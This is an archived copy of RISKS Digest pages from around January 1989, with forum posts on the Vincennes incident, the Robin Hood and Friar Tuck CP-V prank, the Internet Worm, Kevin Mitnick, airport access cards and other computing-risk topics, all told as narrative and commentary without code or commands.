the necessary actions to protect himself and his country.  The Pentagon 
brass affirmed with their decision that battle zones are places rife with
confusion and danger, and that errors under those conditions are a fact of
life.

   We learn from this incident that battle zones are no place for innocents
(a lesson that is intuitively obvious), and that we have much to learn 
about how to fight with systems based on men and machines. 

[...]

</PRE>
<HR><H3><A NAME="subj2.2">
Vincennes and the computer
</A>
</H3>
<address>
"Clifford Johnson" 
&lt;<A HREF="mailto:GA.CJJ@Forsythe.Stanford.EDU">
GA.CJJ@Forsythe.Stanford.EDU
</A>&gt;
</address>
<i>
Tue, 27 Dec 88 16:19:08 PST
</i><PRE>

&gt;  In the case of Vincennes, the computer was definitely NOT the only
&gt;  nor the most significant source of information.

What I meant was that without the computer, there wouldn't have even been a
decision to shoot.  The computer-sensor's recognition of military signals
from the take-off airfield triggered, according to rule, an initial
misclassification as hostile until proven otherwise, and without the
computers' tracking of the flight nobody could have believed that the flight
was diving towards the ship.  That the error was due to bad presentation of
data was the Pentagon's conclusion, and why the incident is conclusively
computer-related error.

&gt; To censure the crew of the Vincennes would undermine the
&gt; ability of every man in uniform to take the necessary actions
&gt; to protect himself and his country.

We agree that the conduct of men in such circumstances is inherently an
input-governed impulse.  But your sentiment overlooks that military mission
takes precedence over personal survival, and that protection of innocent
life in the Gulf was the Vincennes' mission.  Viewed in this light, the
reliance placed on the computer-governed drills is unconvincingly justified.

[...]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">

</A>
</H3>
<address>
Jim Horning
&lt;<A HREF="mailto:horning@src.dec.com ">
horning@src.dec.com 
</A>&gt;
</address>
<i>
21 Dec 1988 1349-PST (Wednesday)
</i><PRE>
Subject: Viruses and System Security (a story) [by Dave Platt]
Date: 20 Dec 88 00:30:03 GMT
Sender: funny@looking.UUCP
Reply-Path: watmath!uunet!arthur.cs.purdue.edu!bee
Also-Submitted-To-RISKS-by: From: Mark Brader &lt;msb@sq.sq.com&gt;

The following story was posted in news.sysadmin recently.

The more things change, the more they stay the same...

Back in the mid-1970s, several of the system support staff at Motorola
(I believe it was) discovered a relatively simple way to crack system
security on the Xerox CP-V timesharing system (or it may have been
CP-V's predecessor UTS).  Through a simple programming strategy, it was
possible for a user program to trick the system into running a portion
of the program in "master mode" (supervisor state), in which memory
protection does not apply.  The program could then poke a large value
into its "privilege level" byte (normally write-protected) and could
then proceed to bypass all levels of security within the file-management
system, patch the system monitor, and do numerous other interesting
things.  In short, the barn door was wide open.

Motorola quite properly reported this problem to XEROX via an official
"level 1 SIDR" (a bug report with a perceived urgency of "needs to be
fixed yesterday").  Because the text of each SIDR was entered into a
database that could be viewed by quite a number of people, Motorola
followed the approved procedure: they simply reported the problem as
"Security SIDR", and attached all of the necessary documentation,
ways-to-reproduce, etc. separately.

Xerox apparently sat on the problem... they either didn't acknowledge
the severity of the problem, or didn't assign the necessary
operating-system-staff resources to develop and distribute an official
patch.

Time passed (months, as I recall).  The Motorola guys pestered their
Xerox field-support rep, to no avail.  Finally they decided to take
Direct Action, to demonstrate to Xerox management just how easily the
system could be cracked, and just how thoroughly the system security
systems could be subverted.

They dug around through the operating-system listings, and devised a
thoroughly devilish set of patches.  These patches were then
incorporated into a pair of programs called Robin Hood and Friar Tuck.
Robin Hood and Friar Tuck were designed to run as "ghost jobs" (daemons,
in Unix terminology);  they would use the existing loophole to subvert
system security, install the necessary patches, and then keep an eye on
one another's statuses in order to keep the system operator (in effect,
the superuser) from aborting them.

So... one day, the system operator on the main CP-V software-development 
system in El Segundo was surprised by a number of unusual phenomena.
These included the following (as I recall... it's been a while since I
heard the story):

-  Tape drives would rewind and dismount their tapes in the middle of a
   job.

-  Disk drives would seek back&amp;forth so rapidly that they'd attempt to
   walk across the floor.

-  The card-punch output device would occasionally start up of itself
   and punch a "lace card" (every hole punched).  These would usually
   jam in the punch.

-  The console would print snide and insulting messages from Robin Hood
   to Friar Tuck, or vice versa.

-  The Xerox card reader had two output stackers;  it could be
   instructed to stack into A, stack into B, or stack into A unless a
   card was unreadable, in which case the bad card was placed into
   stacker B.  One of the patches installed by the ghosts added some
   code to the card-reader driver... after reading a card, it would flip
   over to the opposite stacker.  As a result, card decks would divide
   themselves in half when they were read, leaving the operator to
   recollate them manually.

I believe that there were some other effects produced, as well.

Naturally, the operator called in the operating-system developers.  They
found the bandit ghost jobs running, and X'ed them... and were once
again surprised.  When Robin Hood was X'ed, the following sequence of
events took place:

  !X id1

  id1:   Friar Tuck... I am under attack!  Pray save me!  (Robin Hood)
  id1: Off (aborted)

  id2: Fear not, friend Robin!  I shall rout the Sheriff of Nottingham's men!

  id3: Thank you, my good fellow! (Robin)

Each ghost-job would detect the fact that the other had been killed, and
would start a new copy of the recently-slain program within a few
milliseconds.  The only way to kill both ghosts was to kill them
simultaneously (very difficult) or to deliberately crash the system.

Finally, the system programmers did the latter... only to find that the
bandits appeared once again when the system rebooted!  It turned out
that these two programs had patched the boot-time image (the /vmunix
file, in Unix terms) and had added themselves to the list of programs
that were to be started at boot time...

The Robin Hood and Friar Tuck ghosts were finally eradicated when the
system staff rebooted the system from a clean boot-tape and reinstalled
the monitor.  Not long thereafter, Xerox released a patch for this
problem.

I believe that Xerox filed a complaint with Motorola's management about
the merry-prankster actions of the two employees in question.  To the
best of my knowledge, no serious disciplinary action was taken against
either of these guys.

Several years later, both of the perpetrators were hired by Honeywell,
which had purchased the rights to CP-V after Xerox pulled out of the
mainframe business.  Both of them made serious and substantial
contributions to the Honeywell CP-6 operating system development effort.
Robin Hood (Dan Holle) did much of the development of the PL-6
system-programming language compiler; Friar Tuck (John Gabler) was one
of the chief communications-software gurus for several years.  They're
both alive and well, and living in LA (Dan) and Orange County (John).
Both are among the more brilliant people I've had the pleasure of
working with.

Disclaimers: it has been quite a while since I heard the details of how
this all went down, so some of the details above are almost certainly
wrong.  I shared an apartment with John Gabler for several years, and he
was my Best Man when I married back in '86... so I'm somewhat
predisposed to believe his version of the events that occurred.

Dave Platt 
  Coherent Thought Inc.  3350 West Bayshore #205  Palo Alto CA 94303

--
Edited by Brad Templeton.  MAIL, yes MAIL your jokes to funny@looking.UUCP
Attribute the joke's source if at all possible.  I will reply, mailers willing.
Remember: If you POST your joke instead of mailing it, I will not reply.

</PRE>
<HR><H3><A NAME="subj3.2">
Stallman, Minsky and Drescher on the Internet Worm
</A>
</H3>
<address>
&lt;<A HREF="mailto:minow%thundr.DEC@decwrl.dec.com ">
minow%thundr.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
20 Dec 88 14:53
</i><PRE>

The following letter appeared in the Business section of the Boston Globe,
20 Dec 1988.  [It does not represent the position of Digital Equipment
Corporation (or my position, either).  Martin Minow]

	Recent computer virus threatens American justice system, too

The recent computer network virus was a prank designed to be harmless.  A
minor programming error made it replicate so much that it clogged Internet,
a research network, with messages.  Now some people want to punish this
accident as deliberate sabotage.

Yes, people should not clog networks.  But the "worm" had parts designed to
avoid clogging; one had an error.  Research is error prone: punishing errors
is futile if limited to errors in pranks.  More rational is to keep critical
computers off research networks, as the military does.

Yes, another worm might be designed to destroy files.  Some people are angry
at these potential future crimes; so angry that they clamor to punish someone
as an example, whether his own deeds deserve it or not.

This clamor threatens the American tradition of justice for each individual
-- something even more valuable than a working Internet.

		Richard Stallman
		Free Software Foundation,
		Cambridge.

		Henry Minsky and Gary Drescher
		MIT Artificial Intelligence Laboratory,
		Cambridge.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
FAA Orders Computer Card Security Systems at 270 Airports
</A>
</H3>
<address>
Henry Mensch
&lt;<A HREF="mailto:henry@GARP.MIT.EDU ">
henry@GARP.MIT.EDU 
</A>&gt;
</address>
<i>
Wed, 4 Jan 89 23:05:01 EST
</i><PRE>

(NY Times, 4 Jan 89) NEW YORK -- In a sweeping new move to tighten security
at United States airports, the government Wednesday ordered that computer
card systems be installed at the busiest terminals by early 1991 to keep
people who might threaten airline safety from reaching restricted areas.
Ultimately, a total of 270 airports would have to install either computer
card systems, resembling those used for automatic banking, or alternative
methods providing equal security.  The Federal Aviation Administration rule,
estimated to cost $170 million over the next 10 years, was proposed in
March. 

The move was made as a result of the crash of a Pacific Southwest Airlines
commuter jet in December 1987 that occurred after a passenger, believed to
have been an employee dismissed by an that had bought PSA, fired several
gunshots during the flight.  All 43 people aboard were killed.

The decree Wednesday had additional significance in the aftermath of the
bombing of a Pan Am jumbo jet over Scotland last month in which a total of
270 people were killed.

In a section of the rule justifying its action, the FAA said currently used
identification badges "provide a means of control once an individual has
gained access to a restricted area."  "The FAA is concerned," it said, "that
these procedures could allow an individual using forged, stolen or
noncurrent identification to compromise the secured areas."  It added that
former employees could use their familiarity with procedures to enter a
"secured area and possibly commit a criminal act on board an aircraft."
[...]
Burnley noted in Wednesday's announcement that computer-controlled card
systems could be programmed to "keep a record of employees who try to enter
areas for which they are not authorized."  "They can also reject cards that
have been reported lost or stolen, or which have not been surrendered by
former employees," he said.

T. Allan McArtor, administrtator of the FAA, said such systems already
were in use at some airports and "have proved to be highly effective
and workable."

Airline officials and airport operators had advanced many objections to the
new rule, including the high cost of installing and operating the
computer-card or other systems.  But in dealing with the cost issue, the FAA
said the total investment "can be recovered fully if one incident, involving
the loss of 170 lives and a wide-bodied jet," were prevented in the next 10
years.  [...]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.01.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.03.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-53</DOCNO>
<DOCOLDNO>IA012-000131-B036-344</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.3.html 128.240.150.127 19970217024808 text/html 23480
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:46:31 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 3</TITLE>
<LINK REL="Prev" HREF="/Risks/8.02.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.04.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.02.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.04.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 3</H1>
<H2> Sunday 8 January 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Computer-related accidental death 
</A>
<DD>
<A HREF="#subj1.1">
Gegg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: Danish Home Companion, Kierkegaard, and Feynman 
</A>
<DD>
<A HREF="#subj2.1">
David E. Leasure
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  "NO CARRIER" 
</A>
<DD>
<A HREF="#subj3.1">
Jef Poskanzer via David Sherman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Tales from the Vincennes tape 
</A>
<DD>
<A HREF="#subj4.1">
Maj. Doug Hardie
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  "Hand-written" letters 
</A>
<DD>
<A HREF="#subj5.1">
Gary Chapman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Dark Side Hacker, an Electronic Terrorist 
</A>
<DD>
<A HREF="#subj6.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  The risks of trusting CBS 
</A>
<DD>
<A HREF="#subj7.1">
Phil Goetz
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Hackers - pure and simple 
</A>
<DD>
<A HREF="#subj8.1">
Travis Marlatte
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Viruses of all kinds 
</A>
<DD>
<A HREF="#subj9.1">
Travis Marlatte
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Henry Cox's "Supercomputer used to `solve' math problem" 
</A>
<DD>
<A HREF="#subj10.1">
John C. Bazigos
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Computer-related accidental death
</A>
</H3>
<address>
&lt;<A HREF="mailto:USER=GEGG@ub.cc.umich.edu">
USER=GEGG@ub.cc.umich.edu
</A>&gt;
</address>
<i>
Sun, 8 Jan 89 15:27:28 EST
</i><PRE>

COMPUTER-RELATED ACCIDENT RESULTS IN WOMAN'S DEATH

JOHANNESBURG, SOUTH AFRICA, 1988 DEC 28 (NB) -- According to the Associated
Press, a South African woman was killed Tuesday in a freak computer-room
accident. The death occurred when 1 1/2-ton steel doors closed on Renata Espach
as she stood in their path but out of sight of optical sensors intended to
detect obstructions. The accident took place at the computer facilities of
Liberty Life in Johannesburg as the 23-year-old woman was handing a document to
a colleague in the course of her employment.
 
found on usa today distribution bbs fido104/555 303-973-4222
 1/7/89 by anonymous guest (no replies pls)

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Re: Danish Home Companion, Kierkegaard, and Feynman (RISKS-8.1)
</A>
</H3>
<address>
&lt;<A HREF="mailto:hou2d!del@att.att.com">
hou2d!del@att.att.com
</A>&gt;
</address>
<i>
Fri, 6 Jan 89 14:05:51 EST
</i><PRE>

  R. P. Feynman in his recent book "What do you care what other people
  think" adapted a Buddist (possibly Shinto, I can't remember) story to
  explain dangers and benefits of technology.  His explanation went something
  like this:  There is a key that opens the gate of heaven and it's the same
  key that opens the gate of hell.  The two gates cannot be distinguished from
  the outside and the only way to tell which is which is to open it.
  Obviously, it's very desirable to have this key because it allows us to
  experience wonderful things, but there's also the risk of hell.  That key is
  technology.

David E. Leasure - AT&amp;T Bell Laboratories - (201) 615-4169

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
"NO CARRIER"
</A>
</H3>
<address>
David Sherman
&lt;<A HREF="mailto:dave@lsuc.UUCP ">
dave@lsuc.UUCP 
</A>&gt;
</address>
<i>
6 Jan 89 07:57:49 EST (Fri)
</i><PRE>

| From: jef@ace.ee.lbl.gov (Jef Poskanzer)
| Newsgroups: comp.misc,comp.dcom.modems
| Subject: NO CARRIER
| Message-ID: &lt;1595@helios.ee.lbl.gov&gt;
| Date: 4 Jan 89 18:38:50 GMT
| 
| Some terminal emulator programs have an amusing bug.  When they see the
| text "NO CARRIER" at the beginning of a line, they stop listening to
| the modem.  Like this:
| 
| NO CARRIER
| 
| If your emulator has this bug, you are no longer on line, and are not
| reading this.  Yes, this sounds far-fetched, but I can personally
| assure you all that it's not just another chain-letter variation like
| the modem virus story.  I discovered this on the WELL a while back when
| I opened a topic called "NO CARRIER", and then got mail from a user
| complaining that whenever he tried to read the topic his modem hung
| up.  He was not computer-literate enough to have been making a joke.
| Recently another user reported the same problem.

Forwarded from Usenet by David Sherman, lsuc!dave@ai.toronto.edu

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
 Re: Tales from the Vincennes tape
</A>
</H3>
<address>
"Maj. Doug Hardie" 
&lt;<A HREF="mailto:Hardie@DOCKMASTER.ARPA">
Hardie@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Thu, 5 Jan 89 14:43 EST
</i><PRE>

I am not surprized by these relevations.  I have observed the same behavior
from my son when he is playing a video game on the computer.  Once people get
into these games, it is as if it was real, as if their life was threatened by
whatever scenario is there.  Perhaps games of that sort based on the particular
equipment and expected mission could be used both in the development of systems
to find out what strange things people will do under pressure, and to help
train the eventual users to understand how to respond when those pressures do
occur.
                                        Doug

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
"Hand-written" letters
</A>
</H3>
<address>
Gary Chapman
&lt;<A HREF="mailto:chapman@csli.Stanford.EDU ">
chapman@csli.Stanford.EDU 
</A>&gt;
</address>
<i>
Thu, 5 Jan 89 09:14:37 PST
</i><PRE>

Jerry Leichter reported this item in an editorial of the New York Times:

        The tide of progress, in other words, sometimes flows backward.
        There's probably only one sure way now to write letters that 
        are, and look, personal: by hand.

Some years ago I was on the PBS television show *Computer Chronicles*, as part
of a panel discussion about the use of computers in U.S. politics.  The other
guest on the show was a gentleman from a large direct mail firm which
specializes in mailings for political causes and candidates.  He brought along
some of his samples to show us how sophisticated mailings are becoming.  One of
them was particularly interesting:  the mailing was sent out to about three
quarters of a million senior citizens in the state of Arizona.  It had to do
with some kind of issue that had an impact on senior citizens, and the polls
indicated the vote was likely to be close (direct mail can make the difference
only when votes are close).  The direct mail company had developed a mail-merge
program using handwriting instead of formed characters, and then had these
letters printed on vast machines that actually wrote out the letters with
high-speed pens, I gathered, so that the final product was virtually
indistinguishable from a handwritten letter.  The stationery the letters were
printed on had only a person's name and home address at the top of the page, as
if it were personal stationery.  The envelopes were printed with the same
handwriting sample and the same process so they appeared to be hand-addressed.
The company even went so far as to affix the stamps (first class of course) on
the outside of the envelope with a jig that rocked back and forth in a frame so
the stamp would only rarely be glued on exactly straight up and down.  

This gentleman from the direct mail company told us proudly that the campaign
headquarters had received something like 14,000 telephone calls the first day
after this mail was delivered, and the election was turned in their client's
favor.

I looked at his sample letters and envelopes and could eventually tell that
these were computer-generated.  But I would not expect senior citizens, who
typically don't imagine that technology is capable of simulating a hand-written
letter so well, to be so discriminating.  I would bet that a large majority of
the recipients were convinced they had received a letter that someone had
painstakingly written to them in a very personal fashion.

-- Gary Chapman, 
   Executive Director, Computer Professionals for Social Responsibility

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Dark Side Hacker, an Electronic Terrorist
</A>
</H3>
<address>
Rodney Hoffman 
&lt;<A HREF="mailto:Hoffman.ElSegundo@Xerox.com">
Hoffman.ElSegundo@Xerox.com
</A>&gt;
</address>
<i>
8 Jan 89 15:09:41 PST (Sunday)
</i><PRE>

Kevin Mitnick, earlier characterized as "armed with a keyboard and
considered dangerous" [see RISKS 7.95] is the subject of a lengthy profile
by John Johnson in the 8 Jan 89 'Los Angeles Times', with the headline:

             Computer an 'Umbilical Cord to His Soul'
	 'DARK SIDE' HACKER SEEN AS 'ELECTRONIC TERRORIST'

When a friend turned him in and Mitnick asked why, the friend replied,
"Because you're a menace to society."  Mitnick is described as 

   25, an overweight, bespectacled ... computer junkie known as a 
   'dark side' hacker for his willingness to use the computer as a 
   weapon.... whose high school computer hobby turned into a lasting
   obsession .... He allegedly used computers at schools and businesses
   to break into Defense Dept. computer systems, sabotage business 
   computers and electronically harass anyone -- including a probation
   officer and FBI agents -- who got in his way.  He also learned how
   to disrupt telephone company operations and disconnected the phones
   of Hollywood celebrities such as Kristy McNichol, authorities said.
   
   So determined was Mitnick, according to friends, that when he suspected
   his home phone was being monitored, he carried his hand-held keyboard 
   to a pay phone in front of a 7-Eleven store, where he hooked it up and
   continued to break into computers around the country.  "He's an electronic
   terrorist, said [the friend who turned him in], "He can ruin someone's 
   life just using his fingers."
   
   Over the last month, three federal court judges have refused at separate
   hearings to set bail for Mitnick, contending there would be no way to 
   protect society from him if he were freed.... Mitnick's lack ofconscience,
   authorities say, makes him even more dangerous than hackers such as Robert 
   Morris Jr., ... who is suspected of infecting computer systems around the 
   country with a "virus" that interfered with their operations.
   
   Mitnick's family and attorney accuse federal prosecutors of blowing the 
   case out of proportion, either out of fear or misunderstanding of the
   technology.  

The story details his "phone phreak" background, and his use of high school
computers to gain access to school district files on remote computers, where
he didn't alter grades, but "caused enough trouble" for administrators and
teachers to watch him closely.  He used the name `Condor,' after a Robert
Redford movie character who outwits the government.  The final digits of his
unlisted home phone were 007, reportedly billed to the name "James Bond."

   [He and a friend] broke into a North American Air Defense Command
   computer in Colorado Springs in 1979.... [The friend] said they did not
   interfere with any defense operation.  "We just got in, looked around,
   and got out."....

   What made Mitnick "the best" said a fellow hacker and friend, was his 
   ability to talk people into giving him privileged information....
   He would call an official with a company he wanted to penetrate and say 
   he was in the maintenance department and needed a computer password.  He
   was so convincing, they gave him the necessary names or numbers....

   He believed he was too clever to be caught.  He had penetrated the DEC
   network in Mass. so effectively that he could read the personal electronic
   mail of security people working on the case of the mysterious hacker and
   discover just how close they were getting to him.  But caught he was, again
   and again.... 
   
   Mitnick's motive for a decade of hacking?  Not money, apparently....
   Friends said he did it all simply for the challenge....  [His one-time
   probation officer says,] "He has a very vindictive streak.  A whole
   bunch of people were harassed.  They call me all the time." .... His
   mastery of the computer was his "source of self-esteem," said a friend.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 The risks of trusting CBS
</A>
</H3>
<address>
&lt;<A HREF="mailto:PGOETZ@LOYVAX.BITNET">
PGOETZ@LOYVAX.BITNET
</A>&gt;
</address>
<i>
Sat, 7 Jan 89 15:03 EST
</i><PRE>

From the Jan. 89 issue of The Institute (a supplement to IEEE Spectrum),
in an IEEE article by Tekla Perry:

  Saratoga, CA- Some 200 personal computer industry pioneers and current
  innovators met here Oct. 7-9 for the invitation-only fourth annual Hackers
  Conference...

  "Hackers," as defined by this group, are "artists of technology," people who
  "derive joy from discovering ways to circumvent limitations," or more
  simply, those who are willing to "hack at that computer keyboard until the
  computer does what you want it to."

[Note that people invited to the Hackers Conference include people like
Steve Wozniak, Bill Gates, Mitch Kapor, etc. (as well as CBS!). Imagine their
surprise when , according to the article:]

  CBS... seemed not to have taken the point. Its Oct. 8 national report led
  with these words: "A small revolutionary army is meeting in the hills above
  California's Silicon Valley this weekend, plotting their next attack on the
  valley below..."

Phil Goetz       PGOETZ@LOYVAX.bitnet

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Hackers - pure and simple
</A>
</H3>
<address>
&lt;<A HREF="mailto:att!ihlpa!travis@ucbvax.Berkeley.EDU">
att!ihlpa!travis@ucbvax.Berkeley.EDU
</A>&gt;
</address>
<i>
Fri, 6 Jan 89 14:05:08 PST
</i><PRE>

I hold a more elementary definition of "hacker". One that was applicable in the
early days and remains so. Very simply, a hacker is one who is keenly
interested in the full capabilities of a system. This implies that
experimenting is done to discover the undocumented features, the limits of the
controls, and the back doors that should not exist. This was and can be done in
a constructive way. This was and can be done in a malicious, irresponsible way.

We, as computer professionals have, then, two responsibilities. First, we must
begin to think of malicious hacking as socially unacceptable. This should not
require the demise of hacking (according to my definition) altogether. The
perpetrator of misdirected hacking must not be rewarded for his or her efforts.
As colleagues of the irresponsible hackers, we must view them with distaste for
they will destroy the profession.

Second, a system of licensing should be implemented. This need not be (but
could be) a knowledge certification. A general form of permission granted to
all who request it would suffice. This license can then be revoked or suspended
upon conviction of some computer related offense. The license number would be
put on resumes, employers would demand new employees to have valid licenses,
and the future of ones career would hinge upon keeping that license intact.

The public has a right and, unfortunately, a need to regulate computer related
activity that affects the public. Some sort of licensing proclaims that society
agrees that this person is trustworthy (so far).  Mr. Morris, Jr. would not, in
my eyes, be eligible to receive a license to practice his trade.

Travis Marlatte       ihlpa!travis       312-416-4479    AT&amp;T Bell Labs

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Viruses of all kinds
</A>
</H3>
<address>
&lt;<A HREF="mailto:att!ihlpa!travis@ucbvax.Berkeley.EDU">
att!ihlpa!travis@ucbvax.Berkeley.EDU
</A>&gt;
</address>
<i>
Fri, 6 Jan 89 14:44:20 PST
</i><PRE>

The analogy between computer viruses and medical viruses is appropriate.
Medical researchers are required to use approved methods for biological
research.  The leverage enacting those requirements comes in the form of:
licensing by a medical board with a list of expectations, laws that protect the
public's safety, and even laws that protect animal rights.

There is nothing to stop a researcher from suddenly going mad and applying his
or her knowledge for malicious purposes.  There is incentive to follow socially
approved channels for conducting legitimate research - fear of losing one's
license or being criminally charged. With these mechanisms and laws in place,
the public has a means to deal with malicious researchers who ignore the rights
of others.

Travis Marlatte       ihlpa!travis       312-416-4479    AT&amp;T Bell Labs

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Henry Cox's "Supercomputer used to `solve' math problem" 
</A>
</H3>
<address>
"John C. Bazigos" 
&lt;<A HREF="mailto:bazigos@cd7.ics.uci.edu">
bazigos@cd7.ics.uci.edu
</A>&gt;
</address>
<i>
Thu, 05 Jan 89 19:59:44 -0800
</i><PRE>

&gt; Date: Wed, 21 Dec 88 09:23:26 est
&gt; From: Henry Cox  &lt;cox@spock.ee.mcgill.ca&gt;
&gt; Subject: Supercomputer used to "solve" math problem (<A HREF="/Risks/7.97.html">RISKS-7.97</A>)

The "Montreal Gazette" errs by espousing the false belief that solving "a
theoretical mathematics problem so complex that it is beyond the capability of
the human mind to comprehend" implies, first, that scientists must "accept the
supercomputer's solution more or less on faith"; and second, that the proof is
not fully understandable for verification purposes.  The necessary and
sufficient condition for verifying a proof is ensuring that each step in the
derivation of the final result is valid -- i.e., follows from formal
definitions, postulates, rules, and validly derived results (i.e., lemmas
and/or theorems).  However, that condition is neither necessary nor sufficient
for understanding the problem: One can, trivially, logically derive a result
that one does not "comprehend"; and inversely, one can comprehend a result,
whether it is true or false, for which no derivation is known --e.g., P being a
strict subset of NP, or Fermat's "Last Theorem"-- or for which no derivation
exists -- e.g., Godel's reflexive assertion of not being a theorem.  The only
faith required to verify any proof is faith in, first, the logical system on
which the verification is based; and second, the verification's valid stepwise
application of that logical system.  Summarily, one not only can, but logically
must, accept the result of validly applying valid logic to premises that one
accepts, regardless of the extent to which (s)he "comprehends" the result.

Now, if my information that the (non-)existence of a finite projective plane of
order 10 does not qualify as "a theoretical mathematics problem so complex that
it is beyond the capability of the human mind to comprehend" is correct --which
seems likely, given that humans programmed the computer to (dis)prove it-- then
the article was blatantly inaccurate in characterizing the problem as
incomprehensible.  However, whether or not the argument was thus falsely
predicated, its logic was, as proven in the immediately preceding paragraph
above, invalid -- and non-trivially so, as Mr.  Cox's above inferences
therefrom demonstrate.

In response to Mr. Cox's terminal (parenthetic) sentence

&gt; [ The RISKS are obvious. The willingness of people to accept a computer's
&gt; answer on faith (whether at the cash register at the grocery store or in the
&gt; university environment) remains disturbing.  		          Henry Cox]

it would be disturbingly anti-progressive of people to continue to trust human
operators more than non-human machines to perform tasks (e.g., tabulating
grocery bills, and operating switching networks) that these machines have
proven themselves superior to humans at executing.

Verifiably yours,                                  -- John C. Bazigos

P.S. Given that the earth's present population is less than 5 billion; it
follows that 1 quadrillion possibilities represents 200,000 possibilities per
person -- which is 4 times the above article's claim of 50,000 per person.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.02.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
